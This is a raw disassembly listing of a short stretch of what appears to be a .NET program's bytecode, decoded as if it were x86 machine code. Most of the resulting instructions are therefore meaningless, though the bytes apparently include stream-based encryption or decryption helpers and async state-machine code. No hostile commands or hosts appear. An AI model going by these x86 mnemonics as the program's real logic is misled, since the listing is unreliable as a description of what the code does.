  4025bd:	7d 0e                	jge    0x4025cd
  4025bf:	00 00                	add    %al,(%eax)
  4025c1:	04 02                	add    $0x2,%al
  4025c3:	7b 0e                	jnp    0x4025d3
  4025c5:	00 00                	add    %al,(%eax)
  4025c7:	04 28                	add    $0x28,%al
  4025c9:	29 00                	sub    %eax,(%eax)
  4025cb:	00 0a                	add    %cl,(%edx)
  4025cd:	07                   	pop    %es
  4025ce:	7b 03                	jnp    0x4025d3
  4025d0:	00 00                	add    %al,(%eax)
  4025d2:	04 02                	add    $0x2,%al
  4025d4:	7b 0e                	jnp    0x4025e4
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	04 6f                	add    $0x6f,%al
  4025da:	2a 00                	sub    (%eax),%al
  4025dc:	00 0a                	add    %cl,(%edx)
  4025de:	3a f2                	cmp    %dl,%dh
  4025e0:	00 00                	add    %al,(%eax)
  4025e2:	00 02                	add    %al,(%edx)
  4025e4:	7b 07                	jnp    0x4025ed
  4025e6:	00 00                	add    %al,(%eax)
  4025e8:	04 02                	add    $0x2,%al
  4025ea:	7b 09                	jnp    0x4025f5
  4025ec:	00 00                	add    %al,(%eax)
  4025ee:	04 6f                	add    $0x6f,%al
  4025f0:	32 00                	xor    (%eax),%al
  4025f2:	00 06                	add    %al,(%esi)
  4025f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4025f5:	2b 00                	sub    (%eax),%eax
  4025f7:	00 0a                	add    %cl,(%edx)
  4025f9:	13 06                	adc    (%esi),%eax
  4025fb:	12 06                	adc    (%esi),%al
  4025fd:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402600:	00 0a                	add    %cl,(%edx)
  402602:	2d 41 02 17 25       	sub    $0x25170241,%eax
  402607:	0a 7d 05             	or     0x5(%ebp),%bh
  40260a:	00 00                	add    %al,(%eax)
  40260c:	04 02                	add    $0x2,%al
  40260e:	11 06                	adc    %eax,(%esi)
  402610:	7d 10                	jge    0x402622
  402612:	00 00                	add    %al,(%eax)
  402614:	04 02                	add    $0x2,%al
  402616:	7c 06                	jl     0x40261e
  402618:	00 00                	add    %al,(%eax)
  40261a:	04 12                	add    $0x12,%al
  40261c:	06                   	push   %es
  40261d:	02 28                	add    (%eax),%ch
  40261f:	04 00                	add    $0x0,%al
  402621:	00 2b                	add    %ch,(%ebx)
  402623:	dd 26                	frstor (%esi)
  402625:	03 00                	add    (%eax),%eax
  402627:	00 02                	add    %al,(%edx)
  402629:	7b 10                	jnp    0x40263b
  40262b:	00 00                	add    %al,(%eax)
  40262d:	04 13                	add    $0x13,%al
  40262f:	06                   	push   %es
  402630:	02 7c 10 00          	add    0x0(%eax,%edx,1),%bh
  402634:	00 04 fe             	add    %al,(%esi,%edi,8)
  402637:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40263c:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  402642:	00 00                	add    %al,(%eax)
  402644:	04 12                	add    $0x12,%al
  402646:	06                   	push   %es
  402647:	28 2d 00 00 0a 26    	sub    %ch,0x260a0000
  40264d:	02 7b 07             	add    0x7(%ebx),%bh
  402650:	00 00                	add    %al,(%eax)
  402652:	04 6f                	add    $0x6f,%al
  402654:	31 00                	xor    %eax,(%eax)
  402656:	00 06                	add    %al,(%esi)
  402658:	6f                   	outsl  %ds:(%esi),(%dx)
  402659:	23 00                	and    (%eax),%eax
  40265b:	00 0a                	add    %cl,(%edx)
  40265d:	13 04 12             	adc    (%edx,%edx,1),%eax
  402660:	04 28                	add    $0x28,%al
  402662:	24 00                	and    $0x0,%al
  402664:	00 0a                	add    %cl,(%edx)
  402666:	2d 41 02 18 25       	sub    $0x25180241,%eax
  40266b:	0a 7d 05             	or     0x5(%ebp),%bh
  40266e:	00 00                	add    %al,(%eax)
  402670:	04 02                	add    $0x2,%al
  402672:	11 04 7d 0f 00 00 04 	adc    %eax,0x400000f(,%edi,2)
  402679:	02 7c 06 00          	add    0x0(%esi,%eax,1),%bh
  40267d:	00 04 12             	add    %al,(%edx,%edx,1)
  402680:	04 02                	add    $0x2,%al
  402682:	28 03                	sub    %al,(%ebx)
  402684:	00 00                	add    %al,(%eax)
  402686:	2b dd                	sub    %ebp,%ebx
  402688:	c2 02 00             	ret    $0x2
  40268b:	00 02                	add    %al,(%edx)
  40268d:	7b 0f                	jnp    0x40269e
  40268f:	00 00                	add    %al,(%eax)
  402691:	04 13                	add    $0x13,%al
  402693:	04 02                	add    $0x2,%al
  402695:	7c 0f                	jl     0x4026a6
  402697:	00 00                	add    %al,(%eax)
  402699:	04 fe                	add    $0xfe,%al
  40269b:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4026a0:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  4026a6:	00 00                	add    %al,(%eax)
  4026a8:	04 12                	add    $0x12,%al
  4026aa:	04 28                	add    $0x28,%al
  4026ac:	26 00 00             	add    %al,%es:(%eax)
  4026af:	0a 13                	or     (%ebx),%dl
  4026b1:	05 11 05 8e 69       	add    $0x698e0511,%eax
  4026b6:	28 2e                	sub    %ch,(%esi)
  4026b8:	00 00                	add    %al,(%eax)
  4026ba:	0a 07                	or     (%edi),%al
  4026bc:	7b 03                	jnp    0x4026c1
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	04 02                	add    $0x2,%al
  4026c2:	7b 0e                	jnp    0x4026d2
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	04 11                	add    $0x11,%al
  4026c8:	05 28 2f 00 00       	add    $0x2f28,%eax
  4026cd:	0a 6f 30             	or     0x30(%edi),%ch
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	0a 2b                	or     (%ebx),%ch
  4026d4:	6a 02                	push   $0x2
  4026d6:	7b 07                	jnp    0x4026df
  4026d8:	00 00                	add    %al,(%eax)
  4026da:	04 02                	add    $0x2,%al
  4026dc:	7b 0a                	jnp    0x4026e8
  4026de:	00 00                	add    %al,(%eax)
  4026e0:	04 6f                	add    $0x6f,%al
  4026e2:	32 00                	xor    (%eax),%al
  4026e4:	00 06                	add    %al,(%esi)
  4026e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e7:	2b 00                	sub    (%eax),%eax
  4026e9:	00 0a                	add    %cl,(%edx)
  4026eb:	13 06                	adc    (%esi),%eax
  4026ed:	12 06                	adc    (%esi),%al
  4026ef:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4026f2:	00 0a                	add    %cl,(%edx)
  4026f4:	2d 41 02 19 25       	sub    $0x25190241,%eax
  4026f9:	0a 7d 05             	or     0x5(%ebp),%bh
  4026fc:	00 00                	add    %al,(%eax)
  4026fe:	04 02                	add    $0x2,%al
  402700:	11 06                	adc    %eax,(%esi)
  402702:	7d 10                	jge    0x402714
  402704:	00 00                	add    %al,(%eax)
  402706:	04 02                	add    $0x2,%al
  402708:	7c 06                	jl     0x402710
  40270a:	00 00                	add    %al,(%eax)
  40270c:	04 12                	add    $0x12,%al
  40270e:	06                   	push   %es
  40270f:	02 28                	add    (%eax),%ch
  402711:	04 00                	add    $0x0,%al
  402713:	00 2b                	add    %ch,(%ebx)
  402715:	dd 34 02             	fnsave (%edx,%eax,1)
  402718:	00 00                	add    %al,(%eax)
  40271a:	02 7b 10             	add    0x10(%ebx),%bh
  40271d:	00 00                	add    %al,(%eax)
  40271f:	04 13                	add    $0x13,%al
  402721:	06                   	push   %es
  402722:	02 7c 10 00          	add    0x0(%eax,%edx,1),%bh
  402726:	00 04 fe             	add    %al,(%esi,%edi,8)
  402729:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40272e:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  402734:	00 00                	add    %al,(%eax)
  402736:	04 12                	add    $0x12,%al
  402738:	06                   	push   %es
  402739:	28 2d 00 00 0a 26    	sub    %ch,0x260a0000
  40273f:	07                   	pop    %es
  402740:	7b 03                	jnp    0x402745
  402742:	00 00                	add    %al,(%eax)
  402744:	04 02                	add    $0x2,%al
  402746:	7b 0e                	jnp    0x402756
  402748:	00 00                	add    %al,(%eax)
  40274a:	04 6f                	add    $0x6f,%al
  40274c:	31 00                	xor    %eax,(%eax)
  40274e:	00 0a                	add    %cl,(%edx)
  402750:	07                   	pop    %es
  402751:	7b 04                	jnp    0x402757
  402753:	00 00                	add    %al,(%eax)
  402755:	04 6f                	add    $0x6f,%al
  402757:	32 00                	xor    (%eax),%al
  402759:	00 0a                	add    %cl,(%edx)
  40275b:	28 33                	sub    %dh,(%ebx)
  40275d:	00 00                	add    %al,(%eax)
  40275f:	0a 0d 09 6f 34 00    	or     0x346f09,%cl
  402765:	00 0a                	add    %cl,(%edx)
  402767:	72 39                	jb     0x4027a2
  402769:	00 00                	add    %al,(%eax)
  40276b:	70 1f                	jo     0x40278c
  40276d:	14 6f                	adc    $0x6f,%al
  40276f:	35 00 00 0a 09       	xor    $0x90a0000,%eax
  402774:	17                   	pop    %ss
  402775:	8d 01                	lea    (%ecx),%eax
  402777:	00 00                	add    %al,(%eax)
  402779:	01 25 16 02 7b 07    	add    %esp,0x77b0216
  40277f:	00 00                	add    %al,(%eax)
  402781:	04 a2                	add    $0xa2,%al
  402783:	6f                   	outsl  %ds:(%esi),(%dx)
  402784:	36 00 00             	add    %al,%ss:(%eax)
  402787:	0a 74 04 00          	or     0x0(%esp,%eax,1),%dh
  40278b:	00 01                	add    %al,(%ecx)
  40278d:	6f                   	outsl  %ds:(%esi),(%dx)
  40278e:	37                   	aaa
  40278f:	00 00                	add    %al,(%eax)
  402791:	0a 13                	or     (%ebx),%dl
  402793:	07                   	pop    %es
  402794:	12 07                	adc    (%edi),%al
  402796:	28 38                	sub    %bh,(%eax)
  402798:	00 00                	add    %al,(%eax)
  40279a:	0a 2d 41 02 1a 25    	or     0x251a0241,%ch
  4027a0:	0a 7d 05             	or     0x5(%ebp),%bh
  4027a3:	00 00                	add    %al,(%eax)
  4027a5:	04 02                	add    $0x2,%al
  4027a7:	11 07                	adc    %eax,(%edi)
  4027a9:	7d 11                	jge    0x4027bc
  4027ab:	00 00                	add    %al,(%eax)
  4027ad:	04 02                	add    $0x2,%al
  4027af:	7c 06                	jl     0x4027b7
  4027b1:	00 00                	add    %al,(%eax)
  4027b3:	04 12                	add    $0x12,%al
  4027b5:	07                   	pop    %es
  4027b6:	02 28                	add    (%eax),%ch
  4027b8:	05 00 00 2b dd       	add    $0xdd2b0000,%eax
  4027bd:	8d 01                	lea    (%ecx),%eax
  4027bf:	00 00                	add    %al,(%eax)
  4027c1:	02 7b 11             	add    0x11(%ebx),%bh
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	04 13                	add    $0x13,%al
  4027c8:	07                   	pop    %es
  4027c9:	02 7c 11 00          	add    0x0(%ecx,%edx,1),%bh
  4027cd:	00 04 fe             	add    %al,(%esi,%edi,8)
  4027d0:	15 0a 00 00 01       	adc    $0x100000a,%eax
  4027d5:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  4027db:	00 00                	add    %al,(%eax)
  4027dd:	04 12                	add    $0x12,%al
  4027df:	07                   	pop    %es
  4027e0:	28 39                	sub    %bh,(%ecx)
  4027e2:	00 00                	add    %al,(%eax)
  4027e4:	0a 02                	or     (%edx),%al
  4027e6:	14 7d                	adc    $0x7d,%al
  4027e8:	0e                   	push   %cs
  4027e9:	00 00                	add    %al,(%eax)
  4027eb:	04 de                	add    $0xde,%al
  4027ed:	13 13                	adc    (%ebx),%edx
  4027ef:	08 02                	or     %al,(%edx)
  4027f1:	11 08                	adc    %ecx,(%eax)
  4027f3:	7d 0c                	jge    0x402801
  4027f5:	00 00                	add    %al,(%eax)
  4027f7:	04 02                	add    $0x2,%al
  4027f9:	17                   	pop    %ss
  4027fa:	7d 0d                	jge    0x402809
  4027fc:	00 00                	add    %al,(%eax)
  4027fe:	04 de                	add    $0xde,%al
  402800:	00 02                	add    %al,(%edx)
  402802:	7b 0d                	jnp    0x402811
  402804:	00 00                	add    %al,(%eax)
  402806:	04 13                	add    $0x13,%al
  402808:	09 11                	or     %edx,(%ecx)
  40280a:	09 17                	or     %edx,(%edi)
  40280c:	40                   	inc    %eax
  40280d:	08 01                	or     %al,(%ecx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	02 02                	add    (%edx),%al
  402813:	7b 0c                	jnp    0x402821
  402815:	00 00                	add    %al,(%eax)
  402817:	04 74                	add    $0x74,%al
  402819:	0b 00                	or     (%eax),%eax
  40281b:	00 01                	add    %al,(%ecx)
  40281d:	7d 12                	jge    0x402831
  40281f:	00 00                	add    %al,(%eax)
  402821:	04 02                	add    $0x2,%al
  402823:	7b 07                	jnp    0x40282c
  402825:	00 00                	add    %al,(%eax)
  402827:	04 02                	add    $0x2,%al
  402829:	7b 0b                	jnp    0x402836
  40282b:	00 00                	add    %al,(%eax)
  40282d:	04 6f                	add    $0x6f,%al
  40282f:	32 00                	xor    (%eax),%al
  402831:	00 06                	add    %al,(%esi)
  402833:	6f                   	outsl  %ds:(%esi),(%dx)
  402834:	2b 00                	sub    (%eax),%eax
  402836:	00 0a                	add    %cl,(%edx)
  402838:	13 06                	adc    (%esi),%eax
  40283a:	12 06                	adc    (%esi),%al
  40283c:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40283f:	00 0a                	add    %cl,(%edx)
  402841:	2d 41 02 1b 25       	sub    $0x251b0241,%eax
  402846:	0a 7d 05             	or     0x5(%ebp),%bh
  402849:	00 00                	add    %al,(%eax)
  40284b:	04 02                	add    $0x2,%al
  40284d:	11 06                	adc    %eax,(%esi)
  40284f:	7d 10                	jge    0x402861
  402851:	00 00                	add    %al,(%eax)
  402853:	04 02                	add    $0x2,%al
  402855:	7c 06                	jl     0x40285d
  402857:	00 00                	add    %al,(%eax)
  402859:	04 12                	add    $0x12,%al
  40285b:	06                   	push   %es
  40285c:	02 28                	add    (%eax),%ch
  40285e:	04 00                	add    $0x0,%al
  402860:	00 2b                	add    %ch,(%ebx)
  402862:	dd e7                	fucom  %st(7)
  402864:	00 00                	add    %al,(%eax)
  402866:	00 02                	add    %al,(%edx)
  402868:	7b 10                	jnp    0x40287a
  40286a:	00 00                	add    %al,(%eax)
  40286c:	04 13                	add    $0x13,%al
  40286e:	06                   	push   %es
  40286f:	02 7c 10 00          	add    0x0(%eax,%edx,1),%bh
  402873:	00 04 fe             	add    %al,(%esi,%edi,8)
  402876:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40287b:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  402881:	00 00                	add    %al,(%eax)
  402883:	04 12                	add    $0x12,%al
  402885:	06                   	push   %es
  402886:	28 2d 00 00 0a 26    	sub    %ch,0x260a0000
  40288c:	02 7b 07             	add    0x7(%ebx),%bh
  40288f:	00 00                	add    %al,(%eax)
  402891:	04 28                	add    $0x28,%al
  402893:	27                   	daa
  402894:	00 00                	add    %al,(%eax)
  402896:	0a 02                	or     (%edx),%al
  402898:	7b 12                	jnp    0x4028ac
  40289a:	00 00                	add    %al,(%eax)
  40289c:	04 6f                	add    $0x6f,%al
  40289e:	3a 00                	cmp    (%eax),%al
  4028a0:	00 0a                	add    %cl,(%edx)
  4028a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4028a3:	3b 00                	cmp    (%eax),%eax
  4028a5:	00 0a                	add    %cl,(%edx)
  4028a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4028a8:	32 00                	xor    (%eax),%al
  4028aa:	00 06                	add    %al,(%esi)
  4028ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4028ad:	2b 00                	sub    (%eax),%eax
  4028af:	00 0a                	add    %cl,(%edx)
  4028b1:	13 06                	adc    (%esi),%eax
  4028b3:	12 06                	adc    (%esi),%al
  4028b5:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4028b8:	00 0a                	add    %cl,(%edx)
  4028ba:	2d 3e 02 1c 25       	sub    $0x251c023e,%eax
  4028bf:	0a 7d 05             	or     0x5(%ebp),%bh
  4028c2:	00 00                	add    %al,(%eax)
  4028c4:	04 02                	add    $0x2,%al
  4028c6:	11 06                	adc    %eax,(%esi)
  4028c8:	7d 10                	jge    0x4028da
  4028ca:	00 00                	add    %al,(%eax)
  4028cc:	04 02                	add    $0x2,%al
  4028ce:	7c 06                	jl     0x4028d6
  4028d0:	00 00                	add    %al,(%eax)
  4028d2:	04 12                	add    $0x12,%al
  4028d4:	06                   	push   %es
  4028d5:	02 28                	add    (%eax),%ch
  4028d7:	04 00                	add    $0x0,%al
  4028d9:	00 2b                	add    %ch,(%ebx)
  4028db:	de 71 02             	fidivs 0x2(%ecx)
  4028de:	7b 10                	jnp    0x4028f0
  4028e0:	00 00                	add    %al,(%eax)
  4028e2:	04 13                	add    $0x13,%al
  4028e4:	06                   	push   %es
  4028e5:	02 7c 10 00          	add    0x0(%eax,%edx,1),%bh
  4028e9:	00 04 fe             	add    %al,(%esi,%edi,8)
  4028ec:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4028f1:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  4028f7:	00 00                	add    %al,(%eax)
  4028f9:	04 12                	add    $0x12,%al
  4028fb:	06                   	push   %es
  4028fc:	28 2d 00 00 0a 26    	sub    %ch,0x260a0000
  402902:	02 7b 12             	add    0x12(%ebx),%bh
  402905:	00 00                	add    %al,(%eax)
  402907:	04 6f                	add    $0x6f,%al
  402909:	3c 00                	cmp    $0x0,%al
  40290b:	00 0a                	add    %cl,(%edx)
  40290d:	28 29                	sub    %ch,(%ecx)
  40290f:	00 00                	add    %al,(%eax)
  402911:	0a 02                	or     (%edx),%al
  402913:	14 7d                	adc    $0x7d,%al
  402915:	12 00                	adc    (%eax),%al
  402917:	00 04 02             	add    %al,(%edx,%eax,1)
  40291a:	14 7d                	adc    $0x7d,%al
  40291c:	0c 00                	or     $0x0,%al
  40291e:	00 04 de             	add    %al,(%esi,%ebx,8)
  402921:	19 13                	sbb    %edx,(%ebx)
  402923:	0a 02                	or     (%edx),%al
  402925:	1f                   	pop    %ds
  402926:	fe                   	(bad)
  402927:	7d 05                	jge    0x40292e
  402929:	00 00                	add    %al,(%eax)
  40292b:	04 02                	add    $0x2,%al
  40292d:	7c 06                	jl     0x402935
  40292f:	00 00                	add    %al,(%eax)
  402931:	04 11                	add    $0x11,%al
  402933:	0a 28                	or     (%eax),%ch
  402935:	3d 00 00 0a de       	cmp    $0xde0a0000,%eax
  40293a:	13 02                	adc    (%edx),%eax
  40293c:	1f                   	pop    %ds
  40293d:	fe                   	(bad)
  40293e:	7d 05                	jge    0x402945
  402940:	00 00                	add    %al,(%eax)
  402942:	04 02                	add    $0x2,%al
  402944:	7c 06                	jl     0x40294c
  402946:	00 00                	add    %al,(%eax)
  402948:	04 28                	add    $0x28,%al
  40294a:	3e 00 00             	add    %al,%ds:(%eax)
  40294d:	0a 2a                	or     (%edx),%ch
  40294f:	00 41 34             	add    %al,0x34(%ecx)
  402952:	00 00                	add    %al,(%eax)
  402954:	00 00                	add    %al,(%eax)
  402956:	00 00                	add    %al,(%eax)
  402958:	6f                   	outsl  %ds:(%esi),(%dx)
  402959:	00 00                	add    %al,(%eax)
  40295b:	00 bb 02 00 00 2a    	add    %bh,0x2a000002(%ebx)
  402961:	03 00                	add    (%eax),%eax
  402963:	00 13                	add    %dl,(%ebx)
  402965:	00 00                	add    %al,(%eax)
  402967:	00 0b                	add    %cl,(%ebx)
  402969:	00 00                	add    %al,(%eax)
  40296b:	01 00                	add    %eax,(%eax)
  40296d:	00 00                	add    %al,(%eax)
  40296f:	00 0e                	add    %cl,(%esi)
  402971:	00 00                	add    %al,(%eax)
  402973:	00 50 04             	add    %dl,0x4(%eax)
  402976:	00 00                	add    %al,(%eax)
  402978:	5e                   	pop    %esi
  402979:	04 00                	add    $0x0,%al
  40297b:	00 19                	add    %bl,(%ecx)
  40297d:	00 00                	add    %al,(%eax)
  40297f:	00 0b                	add    %cl,(%ebx)
  402981:	00 00                	add    %al,(%eax)
  402983:	01 1b                	add    %ebx,(%ebx)
  402985:	30 04 00             	xor    %al,(%eax,%eax,1)
  402988:	8a 00                	mov    (%eax),%al
  40298a:	00 00                	add    %al,(%eax)
  40298c:	05 00 00 11 1f       	add    $0x1f110000,%eax
  402991:	10 8d 2e 00 00 01    	adc    %cl,0x100002e(%ebp)
  402997:	0b 28                	or     (%eax),%ebp
  402999:	40                   	inc    %eax
  40299a:	00 00                	add    %al,(%eax)
  40299c:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40299f:	03 6f 41             	add    0x41(%edi),%ebp
  4029a2:	00 00                	add    %al,(%eax)
  4029a4:	0a 08                	or     (%eax),%cl
  4029a6:	07                   	pop    %es
  4029a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029a8:	42                   	inc    %edx
  4029a9:	00 00                	add    %al,(%eax)
  4029ab:	0a 08                	or     (%eax),%cl
  4029ad:	08 6f 43             	or     %ch,0x43(%edi)
  4029b0:	00 00                	add    %al,(%eax)
  4029b2:	0a 08                	or     (%eax),%cl
  4029b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4029b5:	44                   	inc    %esp
  4029b6:	00 00                	add    %al,(%eax)
  4029b8:	0a 6f 45             	or     0x45(%edi),%ch
  4029bb:	00 00                	add    %al,(%eax)
  4029bd:	0a 0d 73 46 00 00    	or     0x4673,%cl
  4029c3:	0a 13                	or     (%ebx),%dl
  4029c5:	04 11                	add    $0x11,%al
  4029c7:	04 09                	add    $0x9,%al
  4029c9:	17                   	pop    %ss
  4029ca:	73 47                	jae    0x402a13
  4029cc:	00 00                	add    %al,(%eax)
  4029ce:	0a 13                	or     (%ebx),%dl
  4029d0:	05 11 05 02 16       	add    $0x16020511,%eax
  4029d5:	02 8e 69 6f 48 00    	add    0x486f69(%esi),%cl
  4029db:	00 0a                	add    %cl,(%edx)
  4029dd:	11 05 6f 49 00 00    	adc    %eax,0x496f
  4029e3:	0a 11                	or     (%ecx),%dl
  4029e5:	04 6f                	add    $0x6f,%al
  4029e7:	4a                   	dec    %edx
  4029e8:	00 00                	add    %al,(%eax)
  4029ea:	0a 0a                	or     (%edx),%cl
  4029ec:	de 18                	ficomps (%eax)
  4029ee:	11 05 2c 07 11 05    	adc    %eax,0x511072c
  4029f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f5:	4b                   	dec    %ebx
  4029f6:	00 00                	add    %al,(%eax)
  4029f8:	0a dc                	or     %ah,%bl
  4029fa:	11 04 2c             	adc    %eax,(%esp,%ebp,1)
  4029fd:	07                   	pop    %es
  4029fe:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402a01:	4b                   	dec    %ebx
  402a02:	00 00                	add    %al,(%eax)
  402a04:	0a dc                	or     %ah,%bl
  402a06:	09 6f 4b             	or     %ebp,0x4b(%edi)
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	0a de                	or     %dh,%bl
  402a0d:	0a 08                	or     (%eax),%cl
  402a0f:	2c 06                	sub    $0x6,%al
  402a11:	08 6f 4b             	or     %ch,0x4b(%edi)
  402a14:	00 00                	add    %al,(%eax)
  402a16:	0a dc                	or     %ah,%bl
  402a18:	06                   	push   %es
  402a19:	2a 00                	sub    (%eax),%al
  402a1b:	00 01                	add    %al,(%ecx)
  402a1d:	28 00                	sub    %al,(%eax)
  402a1f:	00 02                	add    %al,(%edx)
  402a21:	00 41 00             	add    %al,0x0(%ecx)
  402a24:	1d 5e 00 0c 00       	sbb    $0xc005e,%eax
  402a29:	00 00                	add    %al,(%eax)
  402a2b:	00 02                	add    %al,(%edx)
  402a2d:	00 36                	add    %dh,(%esi)
  402a2f:	00 34 6a             	add    %dh,(%edx,%ebp,2)
  402a32:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402a35:	00 00                	add    %al,(%eax)
  402a37:	00 02                	add    %al,(%edx)
  402a39:	00 0e                	add    %cl,(%esi)
  402a3b:	00 70 7e             	add    %dh,0x7e(%eax)
  402a3e:	00 0a                	add    %cl,(%edx)
  402a40:	00 00                	add    %al,(%eax)
  402a42:	00 00                	add    %al,(%eax)
  402a44:	1b 30                	sbb    (%eax),%esi
  402a46:	04 00                	add    $0x0,%al
  402a48:	8a 00                	mov    (%eax),%al
  402a4a:	00 00                	add    %al,(%eax)
  402a4c:	05 00 00 11 1f       	add    $0x1f110000,%eax
  402a51:	10 8d 2e 00 00 01    	adc    %cl,0x100002e(%ebp)
  402a57:	0a 28                	or     (%eax),%ch
  402a59:	40                   	inc    %eax
  402a5a:	00 00                	add    %al,(%eax)
  402a5c:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402a5f:	03 6f 41             	add    0x41(%edi),%ebp
  402a62:	00 00                	add    %al,(%eax)
  402a64:	0a 08                	or     (%eax),%cl
  402a66:	06                   	push   %es
  402a67:	6f                   	outsl  %ds:(%esi),(%dx)
  402a68:	42                   	inc    %edx
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	0a 08                	or     (%eax),%cl
  402a6d:	08 6f 43             	or     %ch,0x43(%edi)
  402a70:	00 00                	add    %al,(%eax)
  402a72:	0a 08                	or     (%eax),%cl
  402a74:	6f                   	outsl  %ds:(%esi),(%dx)
  402a75:	44                   	inc    %esp
  402a76:	00 00                	add    %al,(%eax)
  402a78:	0a 6f 4c             	or     0x4c(%edi),%ch
  402a7b:	00 00                	add    %al,(%eax)
  402a7d:	0a 0d 73 46 00 00    	or     0x4673,%cl
  402a83:	0a 13                	or     (%ebx),%dl
  402a85:	04 11                	add    $0x11,%al
  402a87:	04 09                	add    $0x9,%al
  402a89:	17                   	pop    %ss
  402a8a:	73 47                	jae    0x402ad3
  402a8c:	00 00                	add    %al,(%eax)
  402a8e:	0a 13                	or     (%ebx),%dl
  402a90:	05 11 05 02 16       	add    $0x16020511,%eax
  402a95:	02 8e 69 6f 48 00    	add    0x486f69(%esi),%cl
  402a9b:	00 0a                	add    %cl,(%edx)
  402a9d:	11 05 6f 49 00 00    	adc    %eax,0x496f
  402aa3:	0a 11                	or     (%ecx),%dl
  402aa5:	04 6f                	add    $0x6f,%al
  402aa7:	4a                   	dec    %edx
  402aa8:	00 00                	add    %al,(%eax)
  402aaa:	0a 0b                	or     (%ebx),%cl
  402aac:	de 18                	ficomps (%eax)
  402aae:	11 05 2c 07 11 05    	adc    %eax,0x511072c
  402ab4:	6f                   	outsl  %ds:(%esi),(%dx)
  402ab5:	4b                   	dec    %ebx
  402ab6:	00 00                	add    %al,(%eax)
  402ab8:	0a dc                	or     %ah,%bl
  402aba:	11 04 2c             	adc    %eax,(%esp,%ebp,1)
  402abd:	07                   	pop    %es
  402abe:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402ac1:	4b                   	dec    %ebx
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	0a dc                	or     %ah,%bl
  402ac6:	09 6f 4b             	or     %ebp,0x4b(%edi)
  402ac9:	00 00                	add    %al,(%eax)
  402acb:	0a de                	or     %dh,%bl
  402acd:	0a 08                	or     (%eax),%cl
  402acf:	2c 06                	sub    $0x6,%al
  402ad1:	08 6f 4b             	or     %ch,0x4b(%edi)
  402ad4:	00 00                	add    %al,(%eax)
  402ad6:	0a dc                	or     %ah,%bl
  402ad8:	07                   	pop    %es
  402ad9:	2a 00                	sub    (%eax),%al
  402adb:	00 01                	add    %al,(%ecx)
  402add:	28 00                	sub    %al,(%eax)
  402adf:	00 02                	add    %al,(%edx)
  402ae1:	00 41 00             	add    %al,0x0(%ecx)
  402ae4:	1d 5e 00 0c 00       	sbb    $0xc005e,%eax
  402ae9:	00 00                	add    %al,(%eax)
  402aeb:	00 02                	add    %al,(%edx)
  402aed:	00 36                	add    %dh,(%esi)
  402aef:	00 34 6a             	add    %dh,(%edx,%ebp,2)
  402af2:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402af5:	00 00                	add    %al,(%eax)
  402af7:	00 02                	add    %al,(%edx)
  402af9:	00 0e                	add    %cl,(%esi)
  402afb:	00 70 7e             	add    %dh,0x7e(%eax)
  402afe:	00 0a                	add    %cl,(%edx)
  402b00:	00 00                	add    %al,(%eax)
  402b02:	00 00                	add    %al,(%eax)
  402b04:	13 30                	adc    (%eax),%esi
  402b06:	02 00                	add    (%eax),%al
  402b08:	3f                   	aas
  402b09:	00 00                	add    %al,(%eax)
  402b0b:	00 06                	add    %al,(%esi)
  402b0d:	00 00                	add    %al,(%eax)
  402b0f:	11 12                	adc    %edx,(%edx)
  402b11:	00 28                	add    %ch,(%eax)
  402b13:	1b 00                	sbb    (%eax),%eax
  402b15:	00 0a                	add    %cl,(%edx)
  402b17:	7d 16                	jge    0x402b2f
  402b19:	00 00                	add    %al,(%eax)
  402b1b:	04 12                	add    $0x12,%al
  402b1d:	00 02                	add    %al,(%edx)
  402b1f:	7d 18                	jge    0x402b39
  402b21:	00 00                	add    %al,(%eax)
  402b23:	04 12                	add    $0x12,%al
  402b25:	00 03                	add    %al,(%ebx)
  402b27:	7d 17                	jge    0x402b40
  402b29:	00 00                	add    %al,(%eax)
  402b2b:	04 12                	add    $0x12,%al
  402b2d:	00 15 7d 15 00 00    	add    %dl,0x157d
  402b33:	04 12                	add    $0x12,%al
  402b35:	00 7c 16 00          	add    %bh,0x0(%esi,%edx,1)
  402b39:	00 04 12             	add    %al,(%edx,%edx,1)
  402b3c:	00 28                	add    %ch,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	00 00                	add    %al,(%eax)
  402b41:	2b 12                	sub    (%edx),%edx
  402b43:	00 7c 16 00          	add    %bh,0x0(%esi,%edx,1)
  402b47:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b4a:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402b4f:	00 13                	add    %dl,(%ebx)
  402b51:	30 02                	xor    %al,(%edx)
